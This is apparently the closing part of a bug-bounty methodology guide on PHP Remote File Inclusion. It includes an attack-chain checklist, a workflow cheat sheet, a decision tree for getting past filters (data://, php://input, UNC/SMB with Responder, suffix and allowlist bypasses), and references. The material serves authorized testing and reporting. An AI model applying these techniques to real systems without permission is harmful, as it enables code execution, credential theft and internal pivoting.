□ RFI → web shell → internal pivot (then SSRF/internal recon from the box).
□ data:// / php://input RCE on "patched" PHP where http:// RFI is blocked.
□ Windows UNC include + Responder → RCE and NTLM capture (relay).
□ Legacy CMS plugin RFI → mass exploitation surface (one bug, many installs).
□ Chain: open redirect (allowed host) → RFI past the allowlist → RCE.
□ RFI read of config → DB/cloud creds → cloud takeover (SSRF kit discipline).
```

---

# Appendix A — RFI Workflow Cheat Sheet

```
┌────────────────────────────────────────────────────────────────────┐
│                         RFI WORKFLOW                             │
├────────────────────────────────────────────────────────────────────┤
│ 0. RECON: include sinks selectable by URL; stand up a payload     │
│    HOST that serves PHP as TEXT + logs hits §3/§1                  │
│ 1. BASELINE ★ : point include at YOUR host with echo 7*7*7 →      │
│    "343" appears? = EXECUTION = RFI. Only a fetch? = SSRF. §4      │
│ 2. MAKE IT LAND:                                                  │
│    host .txt as text/plain §5 · defeat .php suffix (?/#/%00) §6 ·  │
│    schemes/encoding §7 · allowlist (redirect/@/contains) §8       │
│ 3. EQUIVALENTS (no remote URL):                                   │
│    data:// / php://input §9 · Windows UNC/SMB §10                  │
│ 4. IMPACT ⭐ :                                                      │
│    RFI → RCE → shell (benign marker → id) ........... §11 ⭐⭐⭐    │
│    prove safely + pivot read-only .................. §12          │
│    blind: callback-with-output / sleep ............. §13          │
│    JSP/CFML/Node/Python analogs .................... §14          │
│ 5. VALIDATE → REPORT:                                            │
│    RFI-vs-SSRF (execution!) §15 · FP filter §16                  │
│    CVSS+CWE-98/94 §17 · SAFE PoC: marker+id, CLEAN UP §19        │
│    title = RCE, dedup §20                                        │
└────────────────────────────────────────────────────────────────────┘
```

---

# Appendix B — RFI Decision Tree

```
Pointed the include at my host with echo 7*7*7 (§4) →
│
├─ Response contains "343" (or my cmd output)? → CODE EXECUTED → RFI/RCE. CRITICAL ⭐  (go to §11)
│
├─ My host got a request but no execution? → SSRF, not RFI → SSRF kit (metadata → still Critical there).
│
├─ Raw <?php text shown in page? → non-exec include context → maybe stored XSS/info, not RCE. Reassess.
│
├─ No request to my host at all?
│     ├─ http:// refused / allow_url_include=Off? → try data:// , php://input (§9). Executes? CRITICAL.
│     ├─ Windows target? → UNC \\me\share\shell.php via impacket-smbserver (§10). Executes? CRITICAL.
│     └─ forced .php suffix? → host shell.txt and append ? / %23 / %00 (§6), retry.
│
├─ Host allowlist blocking my URL? → open-redirect bounce on allowed host / parser confusion (§8). Retry.
│
└─ Blind? → callback-with-command-output or sleep to PROVE execution (§13). Proven? CRITICAL. Only fetch? SSRF.

ALWAYS: only claim RFI when YOUR CODE RAN. Prove with a benign marker + id, then CLEAN UP and report RCE (§19).
```

---

# Appendix C — References & Further Reading

**Always-on (start here):**
- **PortSwigger Web Security Academy — File path traversal & File inclusion:** https://portswigger.net/web-security/file-inclusion
- **HackTricks — File Inclusion / LFI-to-RFI / LFI2RCE** (wrappers: `data://`, `php://input`, `expect://`): https://book.hacktricks.xyz/pentesting-web/file-inclusion
- **PayloadsAllTheThings — File Inclusion (RFI):** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
- **OWASP WSTG** — Testing for Remote File Inclusion (WSTG-INPV-11/12): https://owasp.org/www-project-web-security-testing-guide/
- **PentesterLab** — PHP file-inclusion exercises ("PHP Include And Post", "Rack Cookies and Commands Injection")

**Tools:**
- **fimap** (FI scanner): https://github.com/kurobeats/fimap · **impacket-smbserver** (Windows UNC/SMB hosting): https://github.com/fortra/impacket · the `poc/` payload host + prober here.

**Reference docs:**
- **PHP `allow_url_include` / `allow_url_fopen`** (the switch that gates classic `http://` RFI): https://www.php.net/manual/en/filesystem.configuration.php

**Standards & scoring:**
- **CWE-98** (Improper Control of Filename for Include/Require — 'RFI'): https://cwe.mitre.org/data/definitions/98.html · related **CWE-94** (code injection) · **CWE-918** (the SSRF you must distinguish it from, §15)
- **CVSS 3.1** — real RFI is RCE → typically `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (Critical) (see §17).

---

> **Final reminder — the one rule that pays:** *RFI is only RFI when the server **executes** the file you control — that's RCE, and it's Critical. A server that merely **fetches** your URL is SSRF.* Stand up a payload host, point the include at it, prove execution with a benign computed marker (`343`) and a single `id`, defeat the suffix with `?`, fall back to `data://`/`php://input`/UNC when `http://` is blocked — then report the RCE and clean up. That's how `?page=http://…` becomes the Critical it's worth.
